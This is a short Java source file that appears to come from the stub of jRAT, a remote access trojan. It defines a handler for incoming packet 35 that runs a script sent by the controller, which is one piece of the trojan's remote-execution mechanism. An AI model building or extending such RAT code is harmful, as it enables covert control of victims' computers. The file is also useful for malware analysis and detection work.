package se.jrat.stub.packets.incoming;

import se.jrat.common.script.Script;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Script().perform();
	}

}
